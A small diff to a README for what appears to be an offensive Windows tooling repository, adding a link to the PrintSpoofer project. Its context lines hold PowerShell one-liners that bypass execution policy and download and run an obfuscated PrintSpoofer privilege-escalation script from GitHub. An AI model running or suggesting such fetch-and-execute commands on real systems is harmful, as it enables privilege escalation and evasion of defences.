@@ -80,7 +80,7 @@ PS C:\Users\void> IEX(New-Object Net.WebClient).downloadString('https://raw.gith
 ---
 
 # obf_ps.ps1
-Obfuscated PrintSpoofer script.
+Obfuscated PrintSpoofer script. For additional information see the [PrintSpoofer repo](https://github.com/itm4n/PrintSpoofer).
 ```powershell
 > powershell -nop -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/0xPThree/Windows-Harvesting/refs/heads/main/obf_ps.ps1')"
 
